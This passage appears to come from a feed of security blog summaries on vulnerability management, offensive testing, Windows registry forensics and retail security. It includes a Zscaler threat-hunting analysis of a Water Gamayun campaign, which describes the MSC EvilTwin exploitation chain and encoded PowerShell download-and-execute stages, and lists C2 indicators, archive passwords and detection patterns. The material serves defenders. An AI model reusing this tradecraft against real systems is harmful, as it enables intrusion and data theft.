scan. Use a combination of persistent scanning, agent-based monitoring, and third-party intelligence to achieve near-real-time visibility of new vulnerabilities in your environment.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Align Patching with Business-Critical Assets:&lt;/strong&gt; Not all assets are equal, and neither are vulnerabilities on those assets. Inventory your most critical applications, systems, and data, and incorporate that knowledge into your prioritization. Prioritize fixes that protect what matters most to the business.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Foster Collaboration Between Teams:&lt;/strong&gt; Encourage regular communication and joint processes between the vulnerability management team, threat intelligence analysts, incident responders, and even application developers. Breaking down silos ensures that everyone understands the bigger picture of risk and works together. It also helps in getting buy-in from IT and development teams on urgent patching: when they hear directly from threat intelligence about the potential fallout of not patching, it adds urgency beyond a typical IT ticket.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Measure Success with Metrics:&lt;/strong&gt; To continually improve and demonstrate value, track metrics that gauge both the efficiency and effectiveness of your vulnerability management program. Key metrics might include:\n        &lt;ul&gt;\n          &lt;li&gt;Mean Time to Remediation (MTTR) for critical vulnerabilities (are you patching faster as integration matures?)&lt;/li&gt;\n          &lt;li&gt;Number of exploitable vulnerabilities remaining unpatched (is that trending down?)&lt;/li&gt;\n          &lt;li&gt;Reduction in overall attack surface (perhaps measured by fewer findings on repeat scans or a drop in high-risk exposure as scored by your intel)&lt;/li&gt;\n          &lt;li&gt;Compliance metrics like patch SLAs met&lt;/li&gt;\n          &lt;li&gt;How often threat intelligence inputs lead to preventive action&lt;/li&gt;\n        &lt;/ul&gt;\n      &lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h2&gt;Smarter Vulnerability Management with Threat Intelligence&lt;/h2&gt;\n    &lt;p&gt;Integrating threat intelligence with vulnerability management is a fundamental modernization of how an organization manages cyber risk. By infusing real-world context and automation into the VM process, security teams can make smarter decisions: they fix the vulnerabilities that are most likely to be used in an attack, and they fix them faster and more efficiently than before. The result is a vulnerability management program that is not only more accurate but also more agile and resilient in the face of today\u2019s fast-moving threat landscape.&lt;/p&gt;\n    &lt;p&gt;Ready to take your vulnerability management to the next level? Recorded Future\u2019s Vulnerability Intelligence solution can help you get there. With real-time threat insights, automated risk scoring, and seamless integration into your existing tools, it provides everything you need to proactively reduce risk.&lt;/p&gt;\n</code></pre>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.recordedfuture.com/blog/threat-intelligence-and-vulnerability-management\">Integrating Threat Intelligence and Vulnerability Management: A Modern Approach</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/integrating-threat-intelligence-and-vulnerability-management-a-modern-approach/102029\">Read full topic</a></p>",

      "link": "https://levelblue.com/blogs/security-essentials/from-compliance-to-covert-ops-demystifying-the-offensive-security-landscape",
      "summary": "<p>The merits of deploying offensive testing to strengthen an organization&rsquo;s security posture are well-understood by today&rsquo;s security leadership. Much to the relief of defenders, obtaining approval for an <a href=\"https://www.trustwave.com/en-us/capabilities/by-topic/offensive-security-solutions/\" rel=\"noopener\" target=\"_blank\">offensive security</a> exercise has never been easier.</p>\n\n<p>However, the process of selecting the most appropriate offensive testing solution requires untangling overlapping definitions and vaguely defined terminology that leaves security teams more confused than when they started.</p>\n\n<p>How is an Adversary Emulation different from a <a href=\"https://www.trustwave.com/en-us/resources/library/documents/trustwave-spiderlabs-red-teaming/\" rel=\"noopener\" target=\"_blank\">Red Team</a>? What about this new Breach and Attack Simulation (BAS) tool that has been receiving great publicity recently? Would it be simpler to just invest in a Penetration Test instead?</p>\n\n<p>To help break all this down, we will provide a framework to understand the value proposition of different offensive security services from a defender&rsquo;s perspective, focusing on the core assumptions underlying each solution&rsquo;s methodology. We will also identify important factors that help with narrowing down which form of offensive testing is best suited for your organization.&nbsp;</p>\n\n<h3>The Ends and The Means</h3>\n\n<p>To understand the differences between types of offensive testing, consider the following:&nbsp;</p>\n\n<ul>\n\t<li>Are defenses being tested against attacks in general, or specific adversaries? Are offensive techniques being emulated for maximum realism, or simulated for rapid validation?</li>\n</ul>\n\n<p>This framework allows us to classify offensive security services into four general categories.</p>\n\n<table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"blogTable\" style=\"width: 100%;\">\n\t<thead>\n\t\t<tr>\n\t\t\t<th scope=\"col\">&nbsp;</th>\n\t\t\t<th scope=\"col\"><strong>Attack</strong></th>\n\t\t\t<th scope=\"col\"><strong>Adversary</strong></th>\n\t\t</tr>\n\t</thead>\n\t<tbody>\n\t\t<tr>\n\t\t\t<td><strong>Simulation</strong></td>\n\t\t\t<td style=\"text-align: center;\">Breach and Attack Simulation (BAS)</td>\n\t\t\t<td style=\"text-align: center;\">TTP-Agnostic Red Teaming</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td><strong>Emulation</strong></td>\n\t\t\t<td style=\"text-align: center;\">Penetration Testing</td>\n\t\t\t<td style=\"text-align: center;\">TTP-Driven Red Teaming</td>\n\t\t</tr>\n\t</tbody>\n</table>\n\n<p><br />\nAlthough there is often methodological overlap between the four quadrants, this model can be used to make sense of industry terminology from a defender&rsquo;s point of view by focusing on the how and the why of conducting offensive security testing.</p>\n\n<p>To use a domestic analogy, let&rsquo;s assume you want to ensure your home is safe from being broken into. The type of test you choose will dictate what you learn about your security posture.</p>\n\n<ul>\n\t<li><a href=\"https://levelblue.com/strozfriedberg/cyber-risk-assessment/adversary-simulation-solutions\" rel=\"noopener\" target=\"_blank\">Breach and Attack Simulation (BAS)</a> focuses on the repeatable execution of individual attacks, usually in an automated fashion, targeting specific defensive capabilities, much like trying the door handle every few hours to make sure the lock is engaged. Crucially, the focus is on ensuring that the lock&rsquo;s status is validated, and not on the specific mechanics of how the handle was engaged.</li>\n\t<li><a href=\"https://www.trustwave.com/en-us/services/penetration-testing/\" rel=\"noopener\" target=\"_blank\">Penetration Testing</a>, on the other hand, is a time-bound, scoped assessment targeting a specific goal, usually with the full awareness of the internal security team. This is like hiring a professional burglar to attempt breaking in within a set duration, but with certain limits - lock picking is okay, but smashing the window is out of bounds!</li>\n\t<li><a href=\"https://www.trustwave.com/en-us/resources/library/documents/trustwave-spiderlabs-red-teaming/\" rel=\"noopener\" target=\"_blank\">Red Teaming</a>, whether TTP-driven or not, is a comprehensive exercise that targets an organization similar to how a real-life adversary would, often with no warning provided to defenders. Continuing our analogy, this is similar to tasking professionals with breaking into your house from start to finish, like a real burglar, with few restrictions. In this situation, you may want to smash the window to see if the home security service you paid for is worth the money.</li>\n</ul>\n\n<h3>The Right Tool for the Job</h3>\n\n<p>When selecting an offensive security service, organizations should first ensure that foundational defensive controls are in place. Engaging a Red Team without having validated basic controls will surface findings that would likely also have been discovered with Penetration Testing.</p>\n\n<ul>\n\t<li>First, leverage BAS to identify gaps and misconfigurations and validate the functionality of security tools.</li>\n\t<li>Subsequently, conducting Penetration Tests on internal networks and web applications can unearth additional vulnerabilities and attack paths in custom software and business logic.&nbsp;</li>\n\t<li>Finally, engaging in a Red Team will test defenders&rsquo; readiness to combat a targeted, real-world attack by a sophisticated adversary. The choice of whether a Red Team is TTP-agnostic or TTP-driven (Adversary Emulation vs Simulation) will depend on whether you are concerned about specific threat actors or groups and are interested in testing tailored defenses, such as detection rules for TTPs used to target your industry.</li>\n</ul>\n\n<p>While it is tempting to jump directly to the &ldquo;most realistic&rdquo; form of security testing, this misconception results in limited value being obtained from an offensive security exercise. Adversaries will take the path of least resistance into an organization - before smashing the window, a burglar will pick your lock, but before that, they will certainly just try the handle.</p>",

Being somewhat, maybe even only slightly aware of the Windows Registry, I read the post with casual, even mild interest.&nbsp;</p><p>Someone posted recently that cybersecurity runs on caffeine and sarcasm...I've got my cup of coffee right in front of me, and I've placed the sarcasm in front of us all.&nbsp; ;-)</p><p></p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJDYa7LzI5yU4pAyGbupASIdYz8iOHA8yG-Q13PEJU_ykS0SDT7JAF29CARYvKjZQrKN_2ZN6JJwn7joEXKfSAEZZIL2oXV1H03QukEp9X6wv9WBOd07J2V0xEiirKxPWehtottSqPZIMJxVL06LFCQYu14lVrcMmrYPpet9YcFLlRFptMWQ/s745/appswitched.png\" style=\"clear: right; float: right; margin-bottom: 1em; margin-left: 1em;\"><img border=\"0\" height=\"224\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJDYa7LzI5yU4pAyGbupASIdYz8iOHA8yG-Q13PEJU_ykS0SDT7JAF29CARYvKjZQrKN_2ZN6JJwn7joEXKfSAEZZIL2oXV1H03QukEp9X6wv9WBOd07J2V0xEiirKxPWehtottSqPZIMJxVL06LFCQYu14lVrcMmrYPpet9YcFLlRFptMWQ/s320/appswitched.png\" width=\"320\" /></a></div>The RegRipper <a href=\"https://github.com/keydet89/RegRipper3.0/blob/master/plugins/featureusage.pl\">featureusage plugin</a> was originally written in 2019, and includes a reference to a <a href=\"https://www.crowdstrike.com/en-us/blog/how-to-employ-featureusage-for-windows-10-taskbar-forensics/\">Crowdstrike blog post</a> written in 2020, authored by <a href=\"https://www.linkedin.com/in/jaiminton/\">Jai Minton</a> (who is now with Huntress). The figure to the right was captured from the blog post, and provides a succinct description of how the <i>AppSwitched</i> key is populated. Specifically, Jai stated, \"This key provides the number of times an application switched focus (was left-clicked on the taskbar).\" This helps us understand a bit more about process execution, as for the application to exist on the taskbar and to have it's focus switched, that application has to have been executed.<p></p><p>After finding and reading the blog post, I wrote <a href=\"https://windowsir.blogspot.com/2020/06/plugin-spotlight-printersettings.html\">a brief blog</a> post here on this blog that mentioned the Registry key, and referenced Jai's blog post.</p><p>To Maurice's point, this is, in fact, a valuable artifact, so kudos to Maurice for pointing it out and mentioning it again. If you read through the comments to Maurice's post, there are some hints there as to how to use the value data in your analysis. As you'll note, neither the value names nor the data itself&nbsp; includes a timestamp, but the <i>AppSwitched</i> subkey does have a LastWrite time, and this can be included in a timeline. The value names can be used as pivot points into a timeline, adding something of a \"third dimension\" to timeline analysis. You can use this alongside timestamped information, such as Prefetch entries, Registry data, SRUM DB data, etc.</p>",

Another post on social media stating that IT teams/defenders \"face&nbsp;unprecedented complexity\".&nbsp;<p></p><p>This one stood out amongst all of the posts proclaiming the need for agentic AI on the defender's side, due to how these agents were currently being employed on the attacker side. We hear things like \"autonomous agents\" being able to bring speed and scale to attacks.&nbsp;</p><p>I will say that in my experience, defenders are always going to face complexity, but by it's very nature, I would be very reticent to call it \"unprecedented\". The reason for this is that cybersecurity is usually a bolted-on afterthought, one where the infrastructure already exists with a management culture that is completely against any sort of consolidated effort at overall \"control\".&nbsp;</p><p>Most often, there's no single guiding policy or vision statement, specifically regarding cybersecurity. Many organizations and/or departments may not even fully understand their assets; what endpoints, both physical and virtual, are within their purview? How about applications running on those endpoints? And which of those assets are exposed to the public Internet, or even to access within the infrastructure itself, that don't need to be, or shouldn't be?</p><p>For example, some applications, such as backup or <a href=\"https://www.huntress.com/blog/cracks-in-the-foundation-intrusions-of-foundation-accounting-software\">accounting solutions</a>, will install MSSQL \"under the hood\". Is your IT team aware of this, and if so, have they taken steps to secure this installation? From experience, most don't...the answer to both questions is a resounding \"IDK\".&nbsp;</p><p>Default installations of MSSQL will send login failure attempts to the Application Event Log, but not successful logins. That only really matters if you're monitoring your logs in some way; many aren't, and even with SIEM solutions, these events are sometimes not included in monitoring. I've seen endpoints with upwards of 45K (yes, you read that right...) failed login attempts to MSSQL recorded in the Application Event Log, but this is most often on systems where the application doesn't rely on the MSSQL installation having hard-coded account credentials.&nbsp;</p><p>The point is that basic IT hygiene starts with an accurate asset inventory, and is followed with attack surface reduction. Once you know what systems you have, and what applications should/need to be running on those systems, you can begin to address such things as logging configurations, monitoring (SIEM, EDR, etc.), etc. Attack surface reduction adds to increasing the efficacy of your controls, and to minimizing noise from false positives. Not only does this ensure that you're alerted when a security incident does occur, but it also provides for context, *and* it furthers your ability to quickly determine the nature, scope, and origin of the incident. I've seen organizations who are using SIEM, but the Security Event Log on many of their Windows endpoints are not logging either successful logins, nor failed login attempts.&nbsp;</p><p>This is going to be something of a hot take for many readers, but right now, AI (and specifically agentic AI) is a distraction for defenders. Yes, based on what we're seeing through social media, agentic AI may be furthering threat actors by facilitating faster attacks, at scale, but when it comes right down to it, it's all about the speed and volume; exposure of vulnerable systems remains the same. It's the finding and exploiting the vulnerable systems that's gotten faster.</p><p>The fact is that for the attacks to be successful, even with speed and scale, vulnerable systems need to be exposed to the Internet, and as such, accessed via some means. Yes, even endpoints not directly exposed to the Internet can be compromised via attacks such as phishing, SEO poisoning, or some other means that tricks the user into installing something that reaches out, but even some of these attacks can be inhibited or even obviated by some simple, free modifications to the endpoint itself.&nbsp;</p>",

      "summary": "<p>Warning - before you get started reading this blog post, it's only fair that I warn you...in this post, I make the recommendation that you document your analysis process. If you find this traumatic, you might want to just move on. ;-)</p><p>Robert Jan Mora, a name that I've known for some time within the DFIR community, recently <a href=\"https://www.linkedin.com/posts/robert-jan-mora-4141501_malware-evidence-in-their-own-reporting-activity-7399368132353499136-ksWH\">posted something pretty fascinating on LinkedIn</a>, having to do with a case that he worked a bit ago. His post, in turn, leads to<a href=\"https://thewire.in/rights/malware-evidence-in-their-own-reporting-global-experts-reiterate-bhima-koregaon-reports-seek-end-to-injustice\"> this The Wire article</a>, from India, and includes an interview with him.&nbsp;</p><p>The \"so what\" of the article itself has to do with an initial report that states that no malware was present, and two subsequent reports, one of which is from Robert Jan's analysis, stating that malware was found on a USB device.</p><p>In his LinkedIn post, Robert Jan emphasizes the need for malware scans in a law enforcement environment. Back when I first started working cases, even internally, in the early 2000s, I recommended the same thing, albeit with AV scanners not installed on imaged endpoint. Even more tools are available these days; for example, consider Yara, or something more along the lines of the <a href=\"https://www.nextron-systems.com/thor/\">Thor Scanner</a> from Nextron Systems.</p><p>To learn a bit more about this man, check out <a href=\"https://www.forensicfocus.com/interviews/robert-jan-mora-principal-threat-investigator-volexity/\">this Forensic Focus interview</a>.&nbsp;</p><p>Okay, but so what? Why does this matter, or why is it important?</p><p>When looking to see if malware exists, or did exist on an endpoint, there are different approaches you can take, perhaps using AV scanners, or something like Yara. Or, sometimes, we may not find the actual malware itself, maybe not right away, but we will see clear indications of it's presence, or that it had executed. For example, if you've created a timeline of system activity, you may find a cluster of activity with different components derived from different sources, such as the Registry, Windows Event Log, file system, etc. Separately, these may not be entirely conclusive, but when viewed together, and within a narrow timeframe, they may provide clear indications of something having happened, much like finding footprints, disturbed earth, broken branches, and matted grass following the passage of an animal through a wilderness area.</p><p>You can even find indications of malware having been or even executed on a system, while the executable itself no longer exists on the endpoint at the time of the investigation. Using sources such as the SRUM DB and/or <a href=\"https://www.huntress.com/blog/looking-at-qilin-ransomware-attack\">AmCache.hve and PCA log files</a> may provide valuable insights, even if the malware has been removed from the endpoint.</p><p>When I was working PCI forensic investigations, our team had found that some of the malware used by the threat actors was based on a \"compiled\" Perl script, used to retrieve credit card numbers from a process memory dump. When run, the program extracted the Perl runtime from the EXE, and placed it in a particular folder path, and each time it was run, the path was slightly different; the final folder name changed. However, using file system metadata, we were able to determine a very explicit timeline of the compromise.</p><p>Or, we may find indications that an attempt was made to execute the malware, but it failed, either because it was detected and quarantined, or because something caused it to crash. <a href=\"https://www.huntress.com/blog/looking-at-qilin-ransomware-attack\">PCA log files</a>&nbsp;and application pop-up/WER messages in the Application Event Log have proved to be very illuminating on some of the cases with which I've engaged.</p><p>The key to all of this is to document your analysis process; if you don't know what you did, you can't make modifications or adjustments to the process. For example, if you have a memory dump, how did you go about searching for indications of a specific IP address? Volatility? Bulk_extractor? Don't remember/don't know? If you mounted the image and scanned it with AV, which one/version did you use? Knowing what you did, and what you found, means that you can then make adjustments and improvements to the process over time.</p>",

      "link": "https://www.zscaler.com/blogs/security-research/water-gamayun-apt-attack",
      "summary": "This blog is intended to share an in-depth analysis of a recent multi-stage attack attributed to the Water Gamayun advanced persistent threat group (APT). Drawing on telemetry, forensic reconstruction, and known threat intelligence, the Zscaler Threat Hunting team reconstructed how a seemingly innocuous web search led to a sophisticated exploitation of a Windows MMC vulnerability, ultimately delivering hidden PowerShell payloads and final malware loaders.&nbsp;Key TakeawaysA compromised legitimate site and a lookalike domain were used in tandem to deliver a double-extension RAR payload disguised as a PDF, abusing user trust.The initial payload exploited MSC EvilTwin (CVE-2025-26633) to inject code into&nbsp;mmc.exe, leveraging TaskPad snap-in commands to kick off a series of hidden PowerShell stages.A compromised website, layered obfuscation, password-protected archives, and process-hiding via a small .NET class kept user detection to a minimum while a decoy document was used to preserve the user's perception of a normal interaction.Zscaler Threat Hunting attributed the campaign with high confidence to Water Gamayun based on TTPs consistent with public reporting, including their unique exploitation of MSC EvilTwin, signature obfuscation patterns, infrastructure dual-path design, window-hiding tradecraft, and specific social engineering themes&nbsp;Technical AnalysisWater Gamayun is a Russia-aligned APT group known for targeting enterprise and government networks with stealthy information-stealing campaigns. Their objectives typically include exfiltration of sensitive data, credential harvesting, and long-term persistence through backdoors and custom RATs. Over the past year, Water Gamayun has refined a portfolio of techniques that blend zero-day exploitation, trusted-binary proxy execution, and layered PowerShell obfuscation to evade modern security stacks.Zscaler Threat Hunting recently detected a campaign using suspicious double file extension RAR file downloads. We traced this event back to a compromised BELAY Solutions web page that redirected victims to a newly registered lookalike domain. That domain served a RAR archive masquerading as a PDF brochure, triggering the attack foothold.&nbsp;Phase 1: Search and RedirectA normal Bing search for \u201cbelay\u201d leads to&nbsp;belaysolutions[.]com. The website is potentially injected with JavaScript that performs a silent redirect to&nbsp;belaysolutions[.]link, which hosts the double-extension archive.Bing Search URL: www[.]bing[.]com/search?q=belay&[TRUNCATED]&nbsp;Masqueraded RAR URL: belaysolutions[.]link/pdf/hiring_assistant[.]pdf[.]rar&nbsp;Phase 2: MS\u00adC EvilTwin ExploitationOpening&nbsp;Hiring_assistant.pdf.rar drops an&nbsp;.msc file. When run,&nbsp;mmc.exe resolves MUI paths that load the malicious snap-in instead of the legitimate one, triggering embedded TaskPad commands with an encoded PowerShell payload.&nbsp;Phase 3: Stage-1 PowerShellDecoded via -EncodedCommand, this script downloads UnRAR[.]exe and a password-protected RAR, extracts the next stage, waits briefly, then Invoke-Expression on the extracted script.Phase 4: Stage-2PowerShellThis second script compiles C# WinHpXN to hide console windows, displays a decoy PDF, and downloads, extracts, and executes the final loader ItunesC.exe multiple times for persistence.&nbsp;Phase 5: Final Payload ExecutionItunesC[.]exe installs backdoors or stealers. We were unable to confirm the precise malware family in this specific instance because the Command and Control (C2) infrastructure was non-responsive.. However, Water Gamayun\u2019s arsenal includes EncryptHub, SilentPrism, DarkWisp, and Rhadamanthys, so it is highly likely that any of these malware could have been installed.&nbsp;Who is Water Gamayun and What Drives Them?Water Gamayun has emerged in public reporting throughout 2025 as a sophisticated, likely Russian threat actor specializing in supply-chain and zero-day\u2013driven intrusion campaigns. Their primary motives appear to be:Strategic intelligence gathering against organizations of high commercial or geopolitical valueCredential theft to facilitate further compromise or lateral movementLong-term persistence via custom backdoors such as SilentPrism and DarkWisp, and information-stealers like EncryptHub and RhadamanthysTheir operations often feature:Exploitation of novel vulnerabilities, including CVE-2025-26633 for MSC EvilTwinTrusted-binary proxy execution, running hidden scripts through&nbsp;mmc.exe or other legitimate Windows binariesComplex obfuscation chains, employing nested Base64, UTF-16LE encoding, and runtime string cleanupHigh OPSEC standards, using strong archive passwords, randomized C2 paths, and decoy documents&nbsp;&nbsp;How Zscaler Threat Hunting Attributed This CampaignZscaler Threat Hunting attribution is grounded in multiple converging lines of evidence:Exploitation of MSC EvilTwinThe first payload exploited CVE-2025-26633, a weakness in MMC\u2019s multilingual path resolution. This exploit vector is rare in the wild and consistently tied to Water Gamayun\u2019s malware delivery campaigns.&nbsp;Signature PowerShell ObfuscationThe nested Base64 UTF-16LE with underscore-replace obfuscation, followed by&nbsp;Invoke-Expression, is a hallmark seen in publicly documented Water Gamayun scripts. We matched the exact string manipulation patterns documented in prior analyses.&nbsp;Process-Hiding via Win32 APICompiling a minimal .NET class called WinHpXN to call `ShowWindow` and hide console windows aligns directly with previous Water Gamayun tradecraft notes. Zscaler Threat Hunting located identical code snippets in open-source reporting on the group\u2019s 2025 campaigns.&nbsp;Infrastructure PatternsAll payloads and tools were hosted on a single IP (103[.]246[.]147[.]17) with two randomized path prefixes (`/cAKk9xnTB/` and `/yyC15x4zbjbTd/`), matching the group\u2019s dual-path C2 architecture observed in the past campaigns.&nbsp;Social Engineering ThemeThe \u201cHiring_assistant.pdf\u201d lure and follow-on \u201ciTunesC\u201d branding match Water Gamayun\u2019s history of employment- and consumer-themed decoys.&nbsp;Password ComplexityThe 21-character alphanumeric archive passwords k5vtzxdeDzicRCT and&nbsp;jkN5yyC15x4zbjbTdUS3y meet the OPSEC profile Water Gamayun is known to apply to evade sandbox automation.By correlating these technical markers with our telemetry, Zscaler Threat Hunting concluded with high confidence that Water Gamayun orchestrated this MSC EvilTwin\u2013driven campaign.&nbsp;Zscaler Threat Hunting CoverageZscaler Threat Hunting stands at the forefront of proactive threat detection by combining global scale telemetry, advanced analytics, and the expertise of seasoned threat hunters. At the heart of this capability is Zscaler\u2019s Zero Trust Exchange, which brokers every user connection to apps and data, providing unmatched visibility into real-time web traffic, SSL flows, and cloud activity. With over 500 billion transactions analyzed daily, Zscaler Threat Hunting harnesses this cloud-scale data to spot subtle behaviors and anomalies that would otherwise go undetected in siloed environments.Detection does not start with an alert, it starts with a hypothesis. Zscaler Threat Hunting analysts actively hunt for emerging tactics, techniques, and procedures (TTPs) of adversaries like Water Gamayun, guided by threat intelligence, observed tradecraft, and enriched anomaly detection. Analysts look for clues such as masqueraded file extension download, network connections to uncategorized or newly registered domains, and the use of trusted binaries for proxy execution.Zscaler Threat Hunting and Zscaler ThreatLabz work in close partnership to turn threat hunting findings into scalable protection. When the hunting team uncovers a new threat campaign, ThreatLabz provides continuous analysis to operationalize that intelligence into durable, platform-wide security controls where applicable. The indicators discussed in this blog are now part of the platform\u2019s detection logic to safeguard customers.&nbsp;&nbsp;Detection RecommendationsInitial Access & File DeliveryMonitor for rapid archive extraction from user Temp directories followed by immediate process spawning, especially when the parent process is mmc.exe or other administrative tools.Implement SSL inspection policies to flag lookalike domains against brand reputation databases and identify suspicious redirects from legitimate sites before file download occurs.Flag double-extension files (.pdf.rar, .txt.exe) as high-risk and trigger sandbox detonation on delivery.Encoded PowerShell & ScriptingDetect&nbsp;-EncodedCommand flag usage combined with UTF-16LE Base64 encoding patterns that are uncommon in legitimate workflows.Alert on characteristic underscore-based obfuscation patterns using&nbsp;.Replace('_','') before decoding, a classic Water Gamayun signature.Monitor for&nbsp;Invoke-Expression (iex) execution immediately following Base64 decode operations.Network & Infrastructure IndicatorsMonitor connections from Temp-based processes to external IPs, especially when downloading executable tools and password-protected archives.Identify network beacons to single IPs with randomized path prefixes (e.g.,&nbsp;/cAKk9xnTB/&nbsp;and&nbsp;/yyC15x4zbjbTd/).Block or flag outbound connections to IP&nbsp;103[.]246[.]147[.]17 and similar Water Gamayun infrastructure.Post-Exploitation IndicatorsAlert on ItunesC.exe or similar iTunes-branded executables launched multiple times in succession from Temp.Monitor for beacon callbacks to known Water Gamayun C2 infrastructure or similar patterns from unusual processes.&nbsp;Indicators of Compromise (IOCs)TypeIndicatorFiles & Hashes&nbsp;&nbsp;Hiring_assistant.pdf.rar \u2014 MD5: ba25573c5629cbc81c717e2810ea5afc&nbsp;&nbsp;&nbsp;UnRAR.exe \u2014 MD5: f3d83363ea68c707021bde0870121177&nbsp;&nbsp;&nbsp;as_it_1_fsdfcx.rar \u2014 MD5: 97e4a6cbe8bda4c08c868f7bcf801373&nbsp;&nbsp;&nbsp;as_it_1_fsdfcx.txt \u2014 MD5: caaaef4cf9cf8e9312da1a2a090f8a2c&nbsp;&nbsp;&nbsp;doc.pdf \u2014 MD5: f645558e8e7d5e4f728020af6985dd3f&nbsp;&nbsp;&nbsp;ItunesC.rar \u2014 MD5: e4b6c675f33796b6cf4d930d7ad31f95Archive Passwords&nbsp;&nbsp;k5vtzxdeDzicRCT&nbsp;jkN5yyC15x4zbjbTdUS3yNetwork & Paths&nbsp;IP: 103.246.147.17&nbsp;&nbsp;&nbsp;Paths: /cAKk9xnTB/UnRAR.exe, /cAKk9xnTB/as_it_1_fsdfcx.rar, /cAKk9xnTB/doc.pdf, /yyC15x4zbjbTd/ItunesC.rarDomainsbelaysolutions[.]com (legitimate, potentially compromised)&nbsp;belaysolutions[.]link (malicious)&nbsp;ConclusionThis campaign underscores Water Gamayun\u2019s evolving sophistication that is melding brand trust, zero-day exploitation, and advanced obfuscation to bypass traditional defenses. Zscaler Threat Hunting\u2019s forensic reconstruction and threat intelligence correlate rare exploitation of MSC EvilTwin, signature PowerShell obfuscation, window-hiding code, and dual-path infrastructure to definitively attribute the attack.",

For retailers of all sizes, this peak season is prime time for cybercriminals to exploit vulnerabilities. <a href=\"https://www.trustwave.com/en-us/resources/blogs/trustwave-blog/levelblue-futures-report-retail-leaders-reveal-security-concerns/\" rel=\"noopener\" target=\"_blank\">The 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector</a> highlights a critical disconnect: as attacks become more sophisticated, many retailers are confident yet underprepared.</p>\n\n<h2>The Threat Landscape: Why Black Friday Is a Target</h2>\n\n<p>Retail sector attacks in 2025 have been widespread and devastating, having caused severe operational issues even for prominent retailers like <a href=\"https://www.bbc.com/news/articles/cpq5w324pd3o\" rel=\"noopener\" target=\"_blank\">Harrods</a>, <a href=\"https://thehackernews.com/2025/06/scattered-spider-behind-cyberattacks-on.html\" rel=\"noopener\" target=\"_blank\">Marks &amp; Spencer</a>, and <a href=\"https://www.cnn.com/2025/05/28/business/victorias-secret-website-down-security-incident\" rel=\"noopener\" target=\"_blank\">Victoria&rsquo;s Secret</a>.</p>\n\n<p>The continuing threat actor focus on retail, combined with the intense pressure of Black Friday, only amplifies the risk.</p>\n\n<p>The positive takeaway from these attacks is that they are forcing the C-Suite to take notice of their cybersecurity posture, but a gap remains between awareness and defense capability.</p>\n\n<ul>\n\t<li><strong>High Volume of Attacks:</strong> <strong>44%</strong> of retail executives report experiencing a significantly higher volume of attacks than 12 months ago, with <strong>34% </strong>having suffered a breach in the past year.</li>\n\t<li><strong>AI-Powered Threats Loom:</strong> Organizations expect a rise in AI-powered attacks, deepfakes, and synthetic identity fraud in 2025. Worryingly, only <strong>25%</strong> say they are prepared for AI-powered threats, even though <strong>45%</strong> expect them.</li>\n\t<li><strong>Overconfidence Is a Risk:</strong> <strong>49%</strong> of executives feel highly competent at defending against AI adversaries, but this confidence can lead to complacency. Even confident teams can miss fast-evolving threat vectors without clear, organized oversight.</li>\n</ul>\n\n<p>The data is clear: the threat is real, rapidly evolving, and is not slowing down for the holidays.</p>\n\n<h2>Six Critical Steps to Cyber Resilience for Black Friday</h2>\n\n<p>To protect your business and customers during the busiest shopping event of the year, you must integrate comprehensive cyber resilience into your immediate Black Friday preparation plan.</p>\n\n<h3>1. Prioritize Employee Training and Phishing Defense</h3>\n\n<p>Your staff is your first line of defense, especially against social engineering attacks, which are becoming more persuasive thanks to AI.</p>\n\n<ul>\n\t<li><strong>Educate Staff on Phishing Scams:</strong> Ensure employees know how to recognize and report suspicious emails, links, or attachments, especially those involving payments or sensitive data. <strong>63%</strong> of executives say it&rsquo;s becoming more difficult for employees to identify real threats.</li>\n\t<li><strong>In-Store Fraud Awareness:</strong> Train staff to spot physical credit card fraud. Look for poor-quality holograms/logos, irregular card embossing, tampered signature panels, and suspicious customer behavior (e.g., nervousness, rushing, insisting on multiple declined cards).</li>\n\t<li><strong>Strong Authentication:</strong> Enforce the use of unique, <strong>complex passwords</strong> and <strong>Two-Factor Authentication (2FA)</strong> for all systems accessing sensitive information.</li>\n</ul>\n\n<h3>2. Secure Your Point-of-Sale (POS) and Payment Systems</h3>\n\n<p>POS systems are a primary target as they handle sensitive financial information.</p>\n\n<ul>\n\t<li><strong>Keep Systems Updated:</strong> Regularly <strong>update all POS software and hardware</strong> with the latest security patches to close known vulnerabilities.</li>\n\t<li><strong>Network Separation:</strong> Isolate your POS network from guest Wi-Fi and other operational networks using <strong>firewalls and anti-malware protection</strong>.</li>\n\t<li><strong>Modern Payment Security:</strong> Adopt <strong>EMV chip readers</strong> and accept <strong>digital wallets (Apple Pay, Google Pay)</strong>, which use tokenization to avoid sharing actual card information, significantly reducing fraud risk.</li>\n\t<li><strong>Online Sales Authentication:</strong> For e-commerce, implement <strong>CAPTCHA </strong>to block bots and <strong>3D Secure Authentication</strong> for credit card payments to verify the customer&rsquo;s identity during checkout, reducing card-not-present fraud.</li>\n</ul>\n\n<h3>3. Strengthen Your Software Supply Chain</h3>\n\n<p>The holiday season often involves integrating new tools or working with more vendors. Retail organizations are underestimating the risks posed by their ecosystem.</p>\n\n<ul>\n\t<li><strong>Increase Visibility:</strong> <strong>47%</strong> of executives have very low to moderate visibility into their software supply chain. You must push for better insight.</li>\n\t<li><strong>Vet Third-Party Vendors:</strong> Only <strong>22%</strong> of retailers prioritize engaging with suppliers about their security credentials. <strong>Immediately vet all third-party apps and services</strong> used for e-commerce, payment processing, or customer management.</li>\n\t<li><strong>Limit Access:</strong> Only grant vendors the minimal access they need. <strong>Immediately revoke access</strong> for any vendor or integration no longer in use.</li>\n</ul>\n\n<h3>4. Adopt a Proactive, Zero Trust Architecture</h3>\n\n<p>Move from a reactive to a proactive security posture. A <strong>Zero Trust Architecture (ZTA)</strong> is a foundational strategy for a multi-layered defense.</p>\n\n<ul>\n\t<li><strong>Move to ZTA:</strong> ZTA helps identify suspicious behavior quickly by implementing the principle of <strong>&ldquo;never trust, always verify.&rdquo;</strong> While only 